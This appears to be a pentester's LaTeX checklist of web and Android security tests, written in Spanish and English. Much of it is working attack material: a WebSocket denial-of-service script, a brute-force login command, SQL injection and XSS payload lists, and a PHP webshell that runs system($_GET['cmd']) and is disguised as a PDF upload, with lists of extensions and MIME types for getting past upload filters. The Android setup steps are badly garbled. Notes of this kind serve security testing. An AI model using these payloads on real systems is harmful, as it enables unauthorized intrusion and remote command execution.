
%----------------------------------------------------------------------------------------
%	SECTIONS
%----------------------------------------------------------------------------------------

\section{Herramientas}

\begin{itemize}
\item ADB (Android Debug Bridge)
\item Apktool
 \item Drozer
 \item dex2jar
 \item jd-gui
 \item Mobile Security Framework (MobSF)
 \item Yaazhini
 \item Sixo Online APK Analyzer | sisik
 \item Checkout - VAPT (getastra.com)
 \item Nox Player
\end{itemize}

Nox player requiere desactivatr Hyper V. 

\begin{enumerate}
	\item Instala Root Checker
 \item General settings > Root
 \item Ir a desplazar configuarion > manter wifi> modify settings > proxy
 \item poner burpsuite como all intercaes su ip y puerto local
 \item Instala el certicicado CA http://burpsuite, renombra. der a .cer > instalra ombra rl cerfiica Burp que se par VPN y Apps el certifdicado
 \item Instal el cerifciao con figurtaicon wifi > advanced > install certiciate
\end{enumerate}


\section{WebSocket Unencrypted Communications Verification}

Search for headers: Sec-WebSocket-

\section{WebSocket Cross-site hijacking Test}

\nonumsidenote{Usually a web aplication could work with HTTP 1.0, HTTP 2.0, WebSockets and WebHooks.}
Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.
For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie


\begin{lstlisting}[numbers=none]
	GET /chat HTTP/1.1
	Host: normal-website.com
	Sec-WebSocket-Version: 13
	Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
	Connection: keep-alive, Upgrade
	Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
	Upgrade: websocket
\end{lstlisting}

\begin{fullwidth} % Use the whole page width
The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:
\end{fullwidth}

\section{WebSocket Denial of Service Test}

\begin{lstlisting}[numbers=none]
	const WebSocket = require('ws');
	const net = require('net');
	const wss = new WebSocket.Server({ port: 3000 }, function () {
	  const payload = 'constructor';  // or ',;constructor'
	const request = [
		'GET / HTTP/1.1',
		'Connection: Upgrade',
		'Sec-WebSocket-Key: test',
		'Sec-WebSocket-Version: 8',
		`Sec-WebSocket-Extensions: ${payload}`,
		'Upgrade: websocket',
		'\r\n'
	  ].join('\r\n');
	const socket = net.connect(3000, function () {
		socket.resume();
		socket.write(request);
	  });
	});  
\end{lstlisting}

\section{TLS/SSL Verfication}

TLSLED
\begin{lstlisting}[numbers=none]
sudo apt install tlssled
tlssled vulnerable-site.com 443
\end{lstlisting}

SSLSCAN
\begin{lstlisting}[numbers=none]
sudo apt install sslscan
sslscan https://vulnerable-site.com 
\end{lstlisting}

\section{HTTP Security Headers Verification}

SHCHEK
\begin{lstlisting}[numbers=none]
pip3 install shcheck
shcheck.py https://insecurity.blog
\end{lstlisting}

\section{HTTP Host Header Injection}

CURL
\begin{lstlisting}[numbers=none]
curl -s -D - --header 'Host: the-evil-site.com' https://vulnerable-site.com /index.php/rmpe > output && cat output | grep --color -E '^|the-evil-site.com' 
\end{lstlisting}


\section{HTTP Options Method Verification}

Add nmap to Kali Linux Subsystem
\begin{lstlisting}[numbers=none]
alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
\end{lstlisting}

NMAP
\begin{lstlisting}[numbers=none]
nmap --script http-methods <target>
\end{lstlisting}

In specific path
\begin{lstlisting}[numbers=none]
curl -i -X OPTIONS http://example.org/path
\end{lstlisting}

\section{HTTP Trace Method Check}

\begin{lstlisting}[numbers=none]
curl --insecure -v -X TRACE https://www.google.com/
\end{lstlisting}

La respuesta esperada para que no este activo es: 405 Method Not Allowed

\section{HTTP Cookies Verification}

CURL
\begin{lstlisting}[numbers=none]
curl 'https://vulnerable-site.com' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
\end{lstlisting}

\section{Subresource Integrity (SRI)  Implementation Verification}

CURL
\begin{lstlisting}[numbers=none]
sudo apt install tidy
curl -s https://laysent.github.io/subresource-integrity-demo/integrity.html | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
\end{lstlisting}


\section{Login brute force attack test}

GitHub - FlorianBord2/Hatch-python3-optimised: Hatch is a brute force tool that is used to brute force most websites


\begin{lstlisting}[numbers=none]
	git clone https://github.com/FlorianBord2/Hatch-python3-optimised
\end{lstlisting}


\begin{lstlisting}[numbers=none]
	python main.py --website "https://vulnerable-site.com /login" --passlist  passlist.txt  --username "cibersoc_3tin"  --usernamesel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(1) > div > div > input" --passsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(1) > div > div:nth-child(2) > div > div > input" --loginsel "body > div > div > div > div:nth-child(2) > form > div:nth-child(2) > div > div > div > button > span"
\end{lstlisting}


\section{Web application exploration}

Navigation.

Identify user flows.

\section{Ports identification}

Use NMAP.


\section{Hosted and related applications identification}

Virtual hosts maybe.

\begin{lstlisting}[numbers=none]
nmap -sV --script=http-enum <target>
\end{lstlisting}

\section{User roles identification}

Identify user roles in application names, ids.

\section{Files and folders discover}

\begin{lstlisting}[numbers=none]
sudo apt install dirb
dirb https://vulnerable-site.com /ingresar
\end{lstlisting}

\section{Web application technologies recognition}

Use Walapalizer chrome extension.

\href{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}{Enlace de la extensión}


\section{Search for known vulnerabilities of recognized technologies}

https://security.snyk.io/



\section{Extraction of metadata from downloadable files}

\begin{lstlisting}[numbers=none]
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'>
\end{lstlisting}

\section{Extraction of embedded files}

\begin{lstlisting}[numbers=none]
pip install docscraper 
sudo apt install exiftool


import docscraper 
allowed_domains = ["vulnerable-site.com "]
start_urls = ["https://vulnerable-site.com /index.php/rmpe"]
extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
\end{lstlisting}

\begin{lstlisting}[numbers=none]
wget https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py
python3 link_extractor.py https://github.com -m 2
curl https://vulnerable-site.com /index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\n' | grep -Eo '(http|https|www):(.*)'
\end{lstlisting}

Descargar con el nombre propuesto por el servidor en lugar de wget:
\begin{lstlisting}[numbers=none]
curl -JLO https:\/\/vulnerable-site.com \/index.php\/rmpe\/article\/download\/62\/58\/100
\end{lstlisting}

Search for usernames:
\begin{lstlisting}[numbers=none]
exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'
\end{lstlisting}


\section{Data extraction from Javascript Source Code}

Installation of tools:
\begin{lstlisting}[numbers=none]
pip install jsbeautifier
js-beautify file.js
\end{lstlisting}
	
Encription keys search:
\begin{lstlisting}[numbers=none]
curl -s https://vulnerable-site.com/js/app.dca99adc.js | js-beautify | awk '{$1=$1;print}' | grep -iE  "crypt|aes|hmac|md5|sha512|sha256|sha1"

echo -n 'hsBI69O90juKhpPx' | md5sum 
\end{lstlisting}

In case the code is obsfuscated:
\begin{itemize}
	\item JavaScript Deobfuscator (deobfuscate.io)
	\item de4js | JavaScript Deobfuscator and Unpacker (lelinhtinh.github.io)
\end{itemize}

Encrypt and Decrypt with Key in Online | Online Encryption and Decryption (bitcompiler.com)
JSON Web Tokens - jwt.io

Si esta en cifrado en la URL entonces URL Parameters o algo asi usar primero un URL Decoder URI.

\section{Code injection validation}

\begin{lstlisting}[numbers=none]
' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
\end{lstlisting}

Other payloads:
\begin{lstlisting}[numbers=none]
<a href='www.evil-site.com'>www.evil-site.com link</a>
<a href="javascript:document.write('<image src =q onerror=prompt(8)>')">evil link</a>
<a href="javascript:let pdfWindow = window.open('');pdfWindow.document.write( `<iframe width='100%' height='100%' src='data:text/html;base64, ` + encodeURI(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`) + `'></iframe>` )
">evil link</a>
<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4='>clic on xss</a>
<script>javascript:alert(123456789)</script>
<image src =q onerror=prompt(8)>
<img src="javascript:alert('XSS');">
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe><textarea></iframe><img src='' onerror='alert(document.domain)'>
</textarea><script>alert(/xss/)</script>
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);" onerror="javascript:alert(1)"  onclick="javascript:alert(1)">
<iframe><textarea></iframe><img src="" onerror="alert('14/04/2022')">

<image src =q onerror=`window.parent.location = 'http://127.0.0.1:8000/SPC.html'`>
<image src =q onerror='javascript:alert(1223456789)'>
\end{lstlisting}

Example: Base64 XSS payload
\begin{lstlisting}[numbers=none]
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
\end{lstlisting}

Insert value in HTML element with javascript:
\begin{lstlisting}[numbers=none]
	document.getElementById("f_464cf370-896e-4af1-a0b1-3f4621ff0a36").value = '<script>javascript:alert(123456789)</script>';
\end{lstlisting}
	

\section{Cross Site Scripting Validation}

\begin{lstlisting}[numbers=none]
<script>javascript:alert(1)</script>
\end{lstlisting}

\section{File upload feature check: Webshell upload test}

\begin{lstlisting}[numbers=none]
https://github.com/TheBinitGhimire/Web-Shells
\end{lstlisting}

\begin{lstlisting}[numbers=none]
Content-Disposition: form-data; name="file"; filename="documento.php"
Content-Type: application/pdf

text/x-php

\%PDF-1.7
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<p>This is an example of webshell to execute commands in remote server:</p>
<pre>
<?php
   if(isset($_GET['cmd']))
   {
       system($_GET['cmd']);
   }
?>
<script>javacript:alert('XSS PAYLOAD')</script>
</pre>
</body>
</html>
\%\%EOF

\end{lstlisting}


Change de MimeType to render.

\begin{lstlisting}[numbers=none]

Content-Type: application/x-php

text/x-php
text/html
text/plain
text/x-php
application/x-php
application/x-httpd-php
application/x-httpd-php-source

\end{lstlisting}


Other useful extensions:

\begin{enumerate}
    \item PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
    \item ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
    \item JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm
    \item Flash: .swf
    \item Perl: .pl, .cgi
\end{enumerate}
 
